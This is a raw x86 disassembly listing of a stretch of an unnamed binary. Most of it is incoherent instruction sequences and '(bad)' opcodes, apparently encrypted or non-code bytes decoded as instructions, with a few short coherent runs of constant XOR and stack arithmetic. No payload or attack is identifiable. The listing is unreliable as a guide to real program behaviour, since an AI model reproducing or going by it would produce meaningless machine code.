  40cc57:	cmp    DWORD PTR [edx*8-0x31272f1d],edi
  40cc5e:	rcl    BYTE PTR [esp+ecx*1+0x44bdce0c],cl
  40cc65:	push   eax
  40cc66:	data16 sbb cl,al
  40cc69:	rcr    DWORD PTR [eax-0x6e],1
  40cc6c:	ret    
  40cc6d:	cmc    
  40cc6e:	sahf   
  40cc6f:	sbb    BYTE PTR [ecx+0x5c],0x68
  40cc73:	into   
  40cc74:	aad    0xd3
  40cc76:	and    eax,0x43a20415
  40cc7b:	xchg   esi,eax
  40cc7c:	pop    ss
  40cc7d:	enter  0x1663,0x0
  40cc81:	sub    eax,0x35082475
  40cc86:	and    DWORD PTR [edi-0x48e2eb90],esi
  40cc8c:	adc    al,0xc4
  40cc8e:	pushf  
  40cc8f:	cmp    ebx,ebx
  40cc91:	mov    ds:0x1be0aef5,al
  40cc96:	cdq    
  40cc97:	pushf  
  40cc98:	out    0x1b,al
  40cc9a:	je     0x40ccf7
  40cc9c:	data16 xor BYTE PTR [edx-0x679a9fa8],al
  40cca3:	cmp    al,BYTE PTR [edi]
  40cca5:	in     eax,dx
  40cca6:	mov    eax,ds:0xeb709392
  40ccab:	mov    esi,0xba3969f9
  40ccb0:	mov    bh,BYTE PTR [ebx+eax*4+0x71]
  40ccb4:	pop    ds
  40ccb5:	loop   0x40cd34
  40ccb7:	test   BYTE PTR [ebp+ecx*4+0x67abfbdf],cl
  40ccbe:	adc    DWORD PTR [edx],esp
  40ccc0:	mov    BYTE PTR [edx],al
  40ccc2:	jg     0x40cc86
  40ccc4:	shr    dh,cl
  40ccc6:	test   BYTE PTR [esi+0x8691701],bl
  40cccc:	fnsave [edi-0x3a]
  40cccf:	cmp    ebp,DWORD PTR [ecx]
  40ccd1:	test   BYTE PTR [edx+ebx*8-0x2d80d5c1],cl
  40ccd8:	and    dh,BYTE PTR [ecx-0x38]
  40ccdb:	push   ecx
  40ccdc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ccdd:	ret    0x2da
  40cce0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cce1:	idiv   DWORD PTR [ebp-0x44]
  40cce4:	test   al,0x35
  40cce6:	repnz add al,0x7c
  40cce9:	(bad)  
  40ccea:	jecxz  0x40cc84
  40ccec:	xor    eax,0xe85a988c
  40ccf1:	fcmovnb st,st(1)
  40ccf3:	gs daa 
  40ccf5:	in     al,0x94
  40ccf7:	adc    dl,BYTE PTR [esi-0x3d]
  40ccfa:	scas   eax,DWORD PTR es:[edi]
  40ccfb:	and    DWORD PTR [edi+0x443c41cd],ebx
  40cd01:	sub    bh,bl
  40cd03:	lock std 
  40cd05:	(bad)  
  40cd07:	mov    ch,BYTE PTR [edi-0x13eac38c]
  40cd0d:	repnz sahf 
  40cd0f:	xchg   ebp,eax
  40cd10:	add    al,0xe3
  40cd12:	adc    al,BYTE PTR [ebp+0x6c3cd482]
  40cd18:	sar    DWORD PTR [ebx+0x7d],0x21
  40cd1c:	or     DWORD PTR [eax+0x22],edx
  40cd1f:	sar    BYTE PTR [ebp-0x3150650c],1
  40cd25:	sub    ch,BYTE PTR [eax-0x7e794000]
  40cd2b:	jge    0x40ccde
  40cd2d:	mov    ds:0x98e7ebc,al
  40cd32:	push   0x3
  40cd34:	popa   
  40cd35:	xor    DWORD PTR [esi],esi
  40cd37:	lock jb 0x40cd76
  40cd3a:	aaa    
  40cd3b:	test   eax,0x5230877d
  40cd40:	ret    0x3cf8
  40cd43:	repnz mov ebp,0xb4e97891
  40cd49:	push   ebx
  40cd4a:	and    eax,0x8834c68f
  40cd4f:	sbb    bh,BYTE PTR [esi-0xf]
  40cd52:	push   esp
  40cd53:	xlat   BYTE PTR ds:[ebx]
  40cd54:	sbb    al,0x84
  40cd56:	lea    edi,[edx-0x46eedde]
  40cd5c:	fidiv  WORD PTR [esp+0x22]
  40cd60:	(bad)  
  40cd61:	popa   
  40cd62:	imul   edi,DWORD PTR ds:[eax-0x2a],0xffffff8e
  40cd67:	aad    0xea
  40cd69:	xchg   ebx,eax
  40cd6a:	mov    esp,0x77851475
  40cd6f:	mul    DWORD PTR [ebp-0x77]
  40cd72:	inc    ebp
  40cd73:	bound  ecx,QWORD PTR [edi+0x65]
  40cd76:	test   DWORD PTR [ecx-0x6f2a619a],ecx
  40cd7c:	push   ecx
  40cd7d:	outs   dx,BYTE PTR ds:[esi]
  40cd7e:	inc    ebp
  40cd7f:	div    DWORD PTR [edi]
  40cd81:	sbb    edx,esp
  40cd83:	icebp  
  40cd84:	call   0xec58bcf4
  40cd89:	in     eax,dx
  40cd8a:	cld    
  40cd8b:	call   0xc38:0x75640b91
  40cd92:	jno    0x40cd8f
  40cd94:	push   es
  40cd95:	xchg   ebp,eax
  40cd96:	pop    esi
  40cd97:	mov    esp,0xad809146
  40cd9c:	js     0x40cd8e
  40cd9e:	arpl   WORD PTR [edi+0x4ebe8b46],di
  40cda4:	retf   
  40cda5:	int3   
  40cda6:	out    0x9d,eax
  40cda8:	ret    0x735
  40cdab:	jmp    0xce73:0x259c59b6
  40cdb2:	adc    bh,cl
  40cdb4:	jle    0x40cd79
  40cdb6:	xchg   ecx,eax
  40cdb7:	(bad)  
  40cdb8:	and    BYTE PTR [ebx-0x59f9855c],bl
  40cdbe:	mov    al,0xda
  40cdc0:	dec    edi
  40cdc1:	fdiv   DWORD PTR [eax]
  40cdc3:	das    
  40cdc4:	into   
  40cdc5:	jnp    0x40ce33
  40cdc7:	popf   
  40cdc8:	xchg   esi,eax
  40cdc9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdca:	cmp    al,dh
  40cdcc:	push   ds
  40cdcd:	jo     0x40cd54
  40cdcf:	ret    0x1ef4
  40cdd2:	dec    ebp
  40cdd3:	push   cs
  40cdd4:	in     eax,dx
  40cdd5:	push   ecx
  40cdd6:	call   0x8afc3aeb
  40cddb:	sbb    dl,dl
  40cddd:	add    DWORD PTR [edi+0x10bf95dc],ebp
  40cde3:	lea    ebp,[ecx+0x58a5a39a]
  40cde9:	outs   dx,DWORD PTR ds:[esi]
  40cdea:	(bad)  
  40cdeb:	push   esi
  40cdec:	dec    esi
  40cded:	push   eax
  40cdee:	mov    ds:0x68f6c347,al
  40cdf3:	shr    DWORD PTR [eax+0x7032df39],1
  40cdf9:	cs stc 
  40cdfb:	aam    0xd8
  40cdfd:	sbb    al,0x4b
  40cdff:	(bad)  
  40ce00:	inc    ecx
  40ce01:	jle    0x40ce66
  40ce03:	nop
  40ce04:	test   bh,cl
  40ce06:	retf   0x3588
  40ce09:	imul   esi,DWORD PTR [esp],0xe503f23f
  40ce10:	and    eax,0x886c0b03
  40ce15:	mov    bh,0xd7
  40ce17:	(bad)  
  40ce18:	sub    eax,0x9575d75c
  40ce1d:	jns    0x40cda9
  40ce1f:	das    
  40ce20:	mov    ebp,0x7e1105fa
  40ce25:	cmp    dl,BYTE PTR [eax-0x441a2b87]
  40ce2b:	pusha  
  40ce2c:	push   ds
  40ce2d:	push   esi
  40ce2e:	cld    
  40ce2f:	xor    eax,0xb6fcf64b
  40ce34:	mov    al,0xde
  40ce36:	je     0x40ce10
  40ce38:	(bad)
  40ce3c:	or     DWORD PTR [ecx+0x64509397],esp
  40ce42:	pop    ebx
  40ce43:	sbb    DWORD PTR [ebx],edx
  40ce45:	dec    esp
  40ce46:	push   cs
  40ce47:	rcl    BYTE PTR [esp+eiz*4-0x3a41f2a8],1
  40ce4e:	mov    eax,0x6e65aa63
  40ce53:	out    dx,eax
  40ce54:	ins    BYTE PTR es:[edi],dx
  40ce55:	loopne 0x40ce11
  40ce57:	mov    ebp,0x6913ef3f
  40ce5c:	in     al,dx
  40ce5d:	cmp    DWORD PTR [esi],esi
  40ce5f:	mov    edx,0x447eec05
  40ce64:	sbb    eax,0x432893b1
  40ce69:	int3   
  40ce6a:	jecxz  0x40ce14
  40ce6c:	frstor [edx]
  40ce6e:	mov    ecx,0xf7ffe609
  40ce73:	out    0x22,eax
  40ce75:	adc    ch,BYTE PTR [eax+ecx*2+0x29]
  40ce79:	(bad)  
  40ce7a:	ds push esp
  40ce7c:	mov    DWORD PTR [edi],eax
  40ce7e:	mov    bl,BYTE PTR [edi-0x23c9ff22]
  40ce84:	push   esi
  40ce85:	sahf   
  40ce86:	aas    
  40ce87:	xor    BYTE PTR [esi+0x7d5f17ab],bh
  40ce8d:	faddp  st(2),st
  40ce8f:	pop    es
  40ce90:	cwde   
  40ce91:	ror    DWORD PTR [ecx+ebp*1],1
  40ce94:	mov    ecx,0x3bff7ef3
  40ce99:	push   ss
  40ce9a:	push   cs
  40ce9b:	inc    ecx
  40ce9c:	add    ecx,ecx
  40ce9e:	xor    BYTE PTR [ebp+0x2fd48a43],ch
  40cea4:	pop    edi
  40cea5:	(bad)  
  40cea6:	xchg   esi,eax
  40cea7:	aaa    
  40cea8:	xor    BYTE PTR [edx],bh
  40ceaa:	(bad)  
  40ceab:	jae    0x40ce4a
  40cead:	int3   
  40ceae:	jmp    0x40cf03
  40ceb0:	out    dx,eax
  40ceb1:	shl    edi,cl
  40ceb3:	mov    bh,ah
  40ceb5:	push   cs
  40ceb6:	std    
  40ceb7:	in     eax,0x7e
  40ceb9:	test   al,0x4
  40cebb:	cmp    eax,0x72c15198
  40cec0:	pop    edx
  40cec1:	or     al,0x80
  40cec3:	(bad)  
  40cec4:	and    al,0x98
  40cec6:	leave  
  40cec7:	sbb    al,0x3d
  40cec9:	or     DWORD PTR [ecx-0x530be8a5],esp
  40cecf:	and    eax,0x89333ff3
  40ced4:	and    bl,BYTE PTR [esp+eax*2]
  40ced7:	xrelease mov BYTE PTR ss:[edx+0x4cfb7602],bh
  40cedf:	jmp    0xa1414159
  40cee4:	jmp    0xd5b0:0xacce733f
  40ceeb:	call   0xdac0:0x59a36756
  40cef2:	outs   dx,DWORD PTR ds:[esi]
  40cef3:	les    ecx,FWORD PTR [esi*4-0x59eb041c]
  40cefa:	mov    edx,0x7c5d0b4
  40ceff:	mov    al,ds:0xe5fde122
  40cf04:	pandn  mm2,QWORD PTR [edx-0x37]
  40cf08:	(bad)  
  40cf09:	out    dx,al
  40cf0a:	mov    cl,0x8f
  40cf0c:	icebp  
  40cf0d:	adc    DWORD PTR [edi],ecx
  40cf0f:	add    esp,0x8084ef9b
  40cf15:	add    DWORD PTR [ebx-0x1],0xc1b66859
  40cf1c:	push   edx
  40cf1d:	fstp   QWORD PTR [ebp+0x7fa84a5]
  40cf23:	loope  0x40ceb7
  40cf25:	in     al,dx
  40cf26:	add    eax,0x92f3e918
  40cf2b:	push   ss
  40cf2c:	stc    
  40cf2d:	xrelease mov BYTE PTR [ebp-0x63b605db],ah
  40cf34:	(bad)  
  40cf35:	daa    
  40cf36:	neg    DWORD PTR [esi+0x13071c33]
  40cf3c:	mov    edx,0x6adc37c1
  40cf41:	cmp    BYTE PTR [ebp-0x45],bl
  40cf44:	mov    edx,edx
  40cf46:	dec    ecx
  40cf47:	cmp    al,0xc9
  40cf49:	das    
  40cf4a:	loop   0x40cf2b
  40cf4c:	mov    eax,ds:0x4f438bef
  40cf51:	mov    eax,DWORD PTR [ebp+0xc]
  40cf54:	add    eax,DWORD PTR [ebp+0x8]
  40cf57:	mov    DWORD PTR [ebp-0x10],eax
  40cf5a:	mov    eax,DWORD PTR [ebp-0x1c]
  40cf5d:	test   eax,eax
  40cf5f:	je     0x40dfcf
  40cf65:	mov    DWORD PTR [ebp-0x24],esi
  40cf68:	push   0xb
  40cf6a:	pop    ecx
  40cf6b:	push   0x5
  40cf6d:	dec    ecx
  40cf6e:	jmp    0x40d28e
  40cf73:	test   DWORD PTR [ebx],ebx
  40cf75:	jnp    0x40cfa2
  40cf77:	mov    eax,ds:0x98b1b52b
  40cf7c:	xchg   ecx,eax
  40cf7d:	rcr    dl,0xba
  40cf80:	mov    ecx,0x96214c46
  40cf85:	jle    0x40d005
  40cf87:	jge    0x40d006
  40cf89:	jle    0x40d009
  40cf8b:	adc    ebp,DWORD PTR [ecx+eiz*2-0x6cf9027f]
  40cf92:	push   esp
  40cf93:	dec    eax
  40cf94:	imul   esp,DWORD PTR [esp+esi*1],0x70
  40cf98:	sbb    BYTE PTR [edi+0x4bdc9f7d],ah
  40cf9e:	test   DWORD PTR [eax+0x3087a935],ebp
  40cfa4:	jbe    0x40cf49
  40cfa6:	mov    ecx,es
  40cfa8:	retf   0x3820
  40cfab:	cmp    bh,BYTE PTR [ebx+0x4]
  40cfae:	clc    
  40cfaf:	push   ds
  40cfb0:	sbb    DWORD PTR [esi-0x6a8923ed],ebp
  40cfb6:	jb     0x40cfb5
  40cfb8:	sar    ecx,1
  40cfba:	fimul  DWORD PTR [eax+0x2f]
  40cfbd:	cld    
  40cfbe:	bndstx [esi-0x58],bnd3
  40cfc2:	push   edi
  40cfc3:	rcl    BYTE PTR [ebp+0x26a33627],cl
  40cfc9:	mov    esp,0xa86fcdeb
  40cfce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfcf:	xor    eax,0xfbaceded
  40cfd4:	adc    eax,DWORD PTR [ecx-0x5e]
  40cfd7:	inc    ebx
  40cfd8:	push   ds
  40cfd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cfda:	out    dx,al
  40cfdb:	in     al,0x9
  40cfdd:	push   cs
  40cfde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cfdf:	mov    ch,0x5e
  40cfe1:	push   esi
  40cfe2:	aad    0x1d
  40cfe4:	inc    eax
  40cfe5:	xlat   BYTE PTR ds:[ebx]
  40cfe6:	int    0xab
  40cfe8:	cwde   
  40cfe9:	clc    
  40cfea:	mov    esi,0x492eca7b
  40cfef:	jb     0x40d02e
  40cff1:	(bad)  
  40cff3:	jp     0x40cffb
  40cff5:	adc    ecx,edx
  40cff7:	add    DWORD PTR [eax+0x1d],ebx
  40cffa:	repnz (bad) 
  40cffc:	arpl   bx,dx
  40cffe:	jnp    0x40d049
  40d000:	mov    esi,0x83848aad
  40d005:	and    eax,0xcd4b4bfb
  40d00a:	sub    DWORD PTR ss:[ebx-0x53b095b1],ebp
  40d011:	push   0xffffffc8
  40d013:	stc    
  40d014:	sbb    DWORD PTR [edx+0x11c776ca],0x51c0e50a
  40d01e:	out    dx,eax
  40d01f:	wbinvd 
  40d021:	sbb    edx,ebx
  40d023:	add    edi,DWORD PTR [edx]
  40d025:	xchg   ebp,eax
  40d026:	icebp  
  40d027:	(bad)  
  40d028:	push   ebx
  40d029:	fmul   DWORD PTR [esi]
  40d02b:	jb     0x40cfc8
  40d02d:	mov    ebx,DWORD PTR ds:0x29807b53
  40d033:	ret    
  40d034:	push   ebx
  40d035:	jge    0x40d05c
  40d037:	inc    edx
  40d038:	cmp    eax,0xaf7efe6a
  40d03d:	das    
  40d03e:	sbb    eax,0xf9ab16ae
  40d043:	pop    edx
  40d044:	inc    eax
  40d045:	sahf   
  40d046:	pop    esp
  40d047:	(bad)  
  40d048:	dec    edx
  40d049:	push   ss
  40d04a:	jl     0x40d09e
  40d04c:	add    BYTE PTR [esi+ebp*2+0x52521efa],bh
  40d053:	lods   eax,DWORD PTR ds:[esi]
  40d054:	aaa    
  40d055:	enter  0x5ab,0xe8
  40d059:	test   eax,0x9d26542e
  40d05e:	sub    esi,DWORD PTR [ebx-0x139112b6]
  40d064:	sbb    ah,al
  40d066:	and    DWORD PTR [edx+0x5c],0xd08f4ca4
  40d06d:	dec    edx
  40d06e:	aaa    
  40d06f:	or     esp,DWORD PTR [ecx+0x71]
  40d072:	and    DWORD PTR [eax+0x307fffb8],edi
  40d078:	sbb    DWORD PTR [edi+0x49],edx
  40d07b:	pop    ebp
  40d07c:	repz adc BYTE PTR [edi],cl
  40d07f:	xchg   ecx,eax
  40d080:	cdq    
  40d081:	jae    0x40d0be
  40d083:	mul    ch
  40d085:	xchg   ebx,eax
  40d086:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d087:	pop    DWORD PTR [ecx-0x4196a5ae]
  40d08d:	cmp    BYTE PTR [edx+0x33],dh
  40d090:	lods   al,BYTE PTR ds:[esi]
  40d091:	jp     0x40d08b
  40d093:	add    ebx,edx
  40d095:	les    ebp,FWORD PTR [esi-0x7dfae8c2]
  40d09b:	add    ebp,DWORD PTR [edx]
  40d09d:	call   0xe04fa9cb
  40d0a2:	pop    edi
  40d0a3:	and    ecx,DWORD PTR [edx+esi*1]
  40d0a6:	inc    edx
  40d0a7:	add    bl,BYTE PTR [esi+edx*1-0x80ed1d7]
  40d0ae:	xchg   ebx,eax
  40d0af:	inc    eax
  40d0b0:	mov    eax,esp
  40d0b2:	sub    dh,bl
  40d0b4:	pop    ecx
  40d0b5:	jp     0x40d0ec
  40d0b7:	lea    ebx,ds:[esi-0x7a]
  40d0bb:	cmp    al,BYTE PTR [edi]
  40d0bd:	inc    esi
  40d0be:	xchg   al,ah
  40d0c0:	int3   
  40d0c1:	and    ebp,edi
  40d0c3:	lods   al,BYTE PTR ds:[esi]
  40d0c4:	dec    BYTE PTR ds:0xdeda6f99
  40d0ca:	sub    eax,DWORD PTR [ebp+0x18]
  40d0cd:	and    ebx,DWORD PTR [ebp+0x2b]
  40d0d0:	js     0x40d0c7
  40d0d2:	jbe    0x40d0bb
  40d0d4:	mov    WORD PTR [ebx-0x5a0e5c59],?
  40d0da:	push   edx
  40d0db:	fisubr DWORD PTR [esi+0xa]
  40d0de:	mov    al,0x5c
  40d0e0:	into   
  40d0e1:	push   edx
  40d0e2:	shl    cl,cl
  40d0e4:	(bad)  ds:0xbe9c553e
  40d0ea:	cdq    
  40d0eb:	and    eax,0x71da2c6d
  40d0f0:	test   DWORD PTR [esi+0x2c63f1d2],0x5c195bef
  40d0fa:	push   esi
  40d0fc:	mov    ebp,0x65547053
  40d101:	fwait
  40d102:	shl    esp,1
  40d104:	xchg   ebx,eax
  40d105:	jae    0x40d0dd
  40d107:	xor    eax,0x93d734a1
  40d10c:	mov    esp,DWORD PTR [ebx*2-0x27dd1e14]
  40d113:	push   ecx
  40d114:	dec    ebp
  40d115:	icebp  
  40d116:	xchg   edx,eax
  40d117:	sub    ecx,DWORD PTR [ecx]
  40d119:	sub    al,bh
  40d11b:	out    dx,eax
  40d11c:	xor    eax,0x916e0259
  40d121:	mov    WORD PTR [ebx-0x164d871b],gs
  40d127:	mov    ah,0xbd
  40d129:	clc    
  40d12a:	cmp    al,0xb7
  40d12c:	shr    DWORD PTR [edx-0x43cbd6db],1
  40d132:	jbe    0x40d0d7
  40d134:	jmp    0x926b:0x7841d363
  40d13b:	int3   
  40d13c:	lds    ebx,FWORD PTR [edx-0x15]
  40d13f:	inc    ebx
  40d140:	push   cs
  40d141:	int    0x78
  40d143:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d144:	cli    
  40d145:	mov    dl,0x5e
  40d147:	pop    ecx
  40d148:	pop    ecx
  40d149:	cmp    BYTE PTR [esi+0xc],dh
  40d14c:	pop    ds
  40d14d:	sub    eax,0x55129051
  40d152:	pop    edx
  40d153:	xor    al,BYTE PTR [edi+0x35]
  40d156:	mov    bh,0xba
  40d158:	icebp  
  40d159:	adc    DWORD PTR [edx+0x6e],edx
  40d15c:	adc    bl,BYTE PTR [ebp-0x4c]
  40d15f:	add    BYTE PTR [edi+ebp*4],dh
  40d162:	pop    ebp
  40d163:	cli    
  40d164:	xchg   ecx,eax
  40d165:	cmp    al,0xdb
  40d167:	(bad)  
  40d168:	cmp    cl,ah
  40d16a:	pusha  
  40d16b:	shl    BYTE PTR [eax-0x3d2f3050],1
  40d171:	fcmove st,st(2)
  40d173:	jns    0x40d145
  40d175:	or     BYTE PTR [esi+eax*2],0x8c
  40d179:	es ss pop ecx
  40d17c:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  40d17e:	inc    ebx
  40d17f:	or     BYTE PTR [ebp-0x4f6fd094],0xac
  40d186:	pop    es
  40d187:	cmp    ah,al
  40d189:	mov    ecx,0xa8fdfebf
  40d18e:	xor    eax,0x9f947fe1
  40d193:	imul   ebx,DWORD PTR [edx+0x35],0x352ead74
  40d19a:	sub    al,0x28
  40d19c:	push   esi
  40d19d:	aad    0xe7
  40d19f:	dec    ecx
  40d1a0:	test   ebx,0x70926a04
  40d1a6:	xor    al,0x10
  40d1a8:	pop    eax
  40d1a9:	and    ch,BYTE PTR [ebp+edx*2-0x2b101e7c]
  40d1b0:	std    
  40d1b1:	or     cl,BYTE PTR [ebx]
  40d1b3:	(bad)  
  40d1b4:	shl    DWORD PTR [ecx+0x41587f27],0x64
  40d1bb:	lods   al,BYTE PTR ds:[esi]
  40d1bc:	sbb    al,0x1d
  40d1be:	mov    eax,0xcd7fcb18
  40d1c3:	mov    ds,ebx
  40d1c5:	imul   eax,DWORD PTR [edx+0x45c99de2],0xed20861b
  40d1cf:	pushf  
  40d1d0:	ss into 
  40d1d2:	stc    
  40d1d3:	mov    eax,ds:0x133473c8
  40d1d8:	sub    DWORD PTR [eax+0x180ac7ff],0x68
  40d1df:	call   0xef54:0xa5f54263
  40d1e6:	retf   0x8c5a
  40d1e9:	jp     0x40d18d
  40d1eb:	ret    0x845b
  40d1ee:	sbb    cl,BYTE PTR [edi]
  40d1f0:	shl    DWORD PTR [esi],1
  40d1f2:	stos   BYTE PTR es:[edi],al
  40d1f3:	int    0x63
  40d1f5:	add    ah,dh
  40d1f7:	jno    0x40d19e
  40d1f9:	shr    BYTE PTR [edx],1
  40d1fb:	sub    eax,0x2d1e6b5f
  40d200:	inc    ecx
  40d201:	mov    al,ds:0x22c00fa1
  40d206:	push   edx
  40d207:	test   al,0x6a
  40d209:	xchg   esp,eax
  40d20a:	stos   DWORD PTR es:[edi],eax
  40d20b:	push   0x47
  40d20d:	loope  0x40d1e5
  40d20f:	(bad)  
  40d210:	mov    WORD PTR [ecx+0x6d237a6c],ss
  40d216:	push   es
  40d217:	outs   dx,BYTE PTR ds:[esi]
  40d218:	stos   DWORD PTR es:[edi],eax
  40d219:	mov    ch,0x99
  40d21b:	push   0x5a105dd8
  40d220:	call   0xc8fef3f
  40d225:	mov    edi,0xbf207187
  40d22a:	sahf   
  40d22b:	cs mov db7,ecx
  40d22f:	push   ebx
  40d230:	mov    al,ds:0x52e0c50a
  40d235:	mov    ?,WORD PTR [edi+0x3c]
  40d238:	ins    BYTE PTR es:[edi],dx
  40d239:	jb     0x40d231
  40d23b:	jo     0x40d20e
  40d23d:	fwait
  40d23e:	and    edx,edx
  40d240:	pop    eax
  40d241:	push   ds
  40d242:	cmp    al,0xa2
  40d244:	cmp    al,0x20
  40d246:	or     ah,al
  40d248:	jmp    0xf659430c
  40d24d:	mov    eax,0x9e7b9d8f
  40d252:	mov    esi,0x4f77887e
  40d257:	push   DWORD PTR [ebx+0x3a23e81c]
  40d25d:	and    DWORD PTR [esp+edi*1-0x5a],esi
  40d261:	imul   BYTE PTR [esi-0x6a9ff61a]
  40d267:	out    0xf1,eax
  40d269:	jle    0x40d1f1
  40d26b:	out    dx,al
  40d26c:	aad    0x14
  40d26e:	mov    ebx,0xc76f14b3
  40d273:	xchg   ecx,eax
  40d274:	js     0x40d2b5
  40d276:	adc    ah,ah
  40d278:	sbb    BYTE PTR [esi+ebx*4+0x40],ah
  40d27c:	sub    ebx,DWORD PTR [esi-0x3684a89d]
  40d282:	dec    esi
  40d283:	cld    
  40d284:	xchg   edi,eax
  40d285:	xchg   bh,dl
  40d287:	fldenv [esi+edi*2-0x2c]
  40d28b:	call   0x879ca021
  40d290:	retf   
  40d291:	sub    ebx,ecx
  40d293:	xchg   ebx,ecx
  40d295:	dec    ecx
  40d296:	mov    eax,DWORD PTR [ebp-0x1c]
  40d299:	imul   eax,ecx
  40d29c:	sub    esp,eax
  40d29e:	mov    DWORD PTR [ebp-0x24],esp
  40d2a1:	mov    eax,DWORD PTR [ebp-0x4]
  40d2a4:	mov    ecx,0x7510854
  40d2a9:	xor    eax,ecx
  40d2ab:	mov    edx,0x32729b
  40d2b0:	add    eax,edx
  40d2b2:	mov    DWORD PTR [ebp+0x8],eax
  40d2b5:	mov    eax,DWORD PTR [ebp-0x18]
  40d2b8:	xor    eax,ecx
  40d2ba:	add    eax,edx
  40d2bc:	mov    edx,DWORD PTR [ebp+0x14]
  40d2bf:	jmp    0x40d5df
  40d2c4:	xor    ch,cl
  40d2c6:	xor    DWORD PTR [ecx+0x69b241f1],eax
  40d2cc:	xor    esi,ebx
  40d2ce:	pop    ecx
  40d2d0:	gs jle 0x40d331
  40d2d3:	inc    edx
  40d2d4:	sub    al,0x95
  40d2d6:	jle    0x40d356
  40d2d8:	jge    0x40d357
  40d2da:	jle    0x40d35a
  40d2dc:	jbe    0x40d2e9
  40d2de:	test   DWORD PTR [ebp+0x6fc6d91b],eax
  40d2e4:	int    0x84
  40d2e6:	inc    ecx
  40d2e7:	mov    ebx,0x8eb37c9e
  40d2ec:	pop    ss
  40d2ed:	add    bh,bh
  40d2ef:	(bad)  
  40d2f1:	iret   
  40d2f2:	push   0x67
  40d2f4:	sti    
  40d2f5:	call   0x4fa6:0xcb2e425b
  40d2fc:	push   eax
  40d2fd:	jno    0x40d32f
  40d2ff:	test   ebp,edi
  40d301:	les    edi,FWORD PTR [ebp-0x3fe265d0]
  40d307:	xchg   ebx,eax
  40d308:	xchg   edi,eax
  40d309:	aaa    
  40d30a:	cs add eax,0xb6c06cc9
  40d310:	shr    dl,cl
  40d312:	add    BYTE PTR [ecx+eax*8-0x39],bl
  40d316:	adc    esi,DWORD PTR [eax-0x73]
  40d319:	in     eax,dx
  40d31a:	xor    BYTE PTR [esi+0x69],al
  40d31d:	push   ecx
  40d31e:	mov    edi,0x3a30591b
  40d323:	mov    al,ds:0x85560279
  40d328:	sub    BYTE PTR [edi+0x59],al
  40d32b:	leave  
  40d32c:	pop    ss
  40d32d:	jno    0x40d2ca
  40d32f:	popa   
  40d330:	inc    ebx
  40d331:	pop    es
  40d332:	add    BYTE PTR [edi-0x55790a52],al
  40d338:	(bad)
  40d33b:	push   DWORD PTR [edx+0x7b]
  40d33e:	ja     0x40d39b
  40d340:	cdq    
  40d341:	pop    esp
  40d342:	mov    gs,WORD PTR [edx]
  40d344:	std    
  40d345:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d346:	and    ebx,DWORD PTR [edi]
  40d348:	pusha  
  40d349:	scas   al,BYTE PTR es:[edi]
  40d34a:	jnp    0x40d38d
  40d34c:	test   BYTE PTR [edi-0x20],ah
  40d34f:	dec    cl
  40d351:	cli    
  40d352:	js     0x40d35b
  40d354:	pop    es
  40d355:	sub    al,0xa6
  40d357:	loope  0x40d3bf
  40d359:	or     eax,0x96e5a6b2
  40d35e:	sub    esp,0x58ea4efd
  40d364:	mov    ds:0x8594e62a,al
  40d369:	xchg   DWORD PTR [esi-0x25],eax
  40d36c:	pop    edi
  40d36d:	sbb    BYTE PTR [ecx+0x2b],cl
  40d370:	add    al,0x34
  40d372:	inc    eax
  40d373:	and    DWORD PTR [edi+0x4f],edx
  40d376:	pop    ss
  40d377:	rcl    DWORD PTR [ebp+0x34],1
  40d37a:	push   ecx
  40d37b:	adc    DWORD PTR [esi+0xf02220f],esi
  40d381:	std    
  40d382:	gs popf 
  40d384:	mov    ds:0x63e52ff5,al
  40d389:	mov    esp,0x9ecb2782
  40d38e:	out    dx,al
  40d38f:	arpl   WORD PTR [ecx+ebx*1+0x42a76bde],sp
  40d396:	(bad)  
  40d397:	dec    edi
  40d398:	cwde   
  40d399:	scas   eax,DWORD PTR es:[edi]
  40d39a:	int    0xd0
  40d39c:	pop    ecx
  40d39d:	sbb    BYTE PTR [ebp-0x1ada0125],bh
  40d3a3:	xlat   BYTE PTR ds:[ebx]
  40d3a4:	and    eax,0xf0c57aeb
  40d3a9:	pushf  
  40d3aa:	ins    BYTE PTR es:[edi],dx
  40d3ab:	enter  0xa2f4,0xb6
  40d3af:	add    al,0x32
  40d3b1:	jae    0x40d418
  40d3b3:	popa   
  40d3b4:	fwait
  40d3b5:	push   ds
  40d3b6:	cmp    ch,ch
  40d3b8:	pop    edx
  40d3b9:	or     ecx,DWORD PTR [edi-0xd]
  40d3bc:	pop    edx
  40d3bd:	jecxz  0x40d42f
  40d3bf:	jg     0x40d3b8
  40d3c1:	repnz int 0xa8
  40d3c4:	xor    esi,ebp
  40d3c6:	sbb    cl,BYTE PTR [ebp-0x41518dbd]
  40d3cc:	(bad)  
  40d3cd:	(bad)  
  40d3cf:	push   ss
  40d3d0:	ja     0x40d418
  40d3d2:	xchg   ebp,eax
  40d3d3:	gs and eax,0x3a0c2a25
  40d3d9:	dec    ecx
  40d3da:	pop    ss
  40d3db:	jbe    0x40d41c
  40d3dd:	cmp    BYTE PTR [eax],dl
  40d3df:	leave  
  40d3e0:	or     eax,0xd213e807
  40d3e5:	popf   
  40d3e6:	jmp    0x430b2f39
  40d3eb:	outs   dx,DWORD PTR ds:[esi]
  40d3ec:	push   eax
  40d3ed:	inc    esp
  40d3ee:	fadd   DWORD PTR [edx+edx*1-0x48]
  40d3f2:	test   al,0xda
  40d3f4:	adc    cl,0xd4
  40d3f7:	mov    esp,0x138d55ab
  40d3fc:	out    0x8,eax
  40d3fe:	test   al,0xa3
  40d400:	xor    eax,0x71dd2766
  40d405:	push   0x1f2e57e4
  40d40a:	cmp    bh,BYTE PTR [edi*8+0x6cdb52eb]
  40d411:	daa    
  40d412:	popa   
  40d413:	jl     0x40d43c
  40d415:	sbb    eax,DWORD PTR [ecx-0x3bbb9b53]
  40d41b:	lods   eax,DWORD PTR ds:[esi]
  40d41c:	std    
  40d41d:	mov    dh,0x7a
  40d41f:	call   0x1f7dbc1e
  40d424:	push   0xffffff90
  40d426:	pop    ds
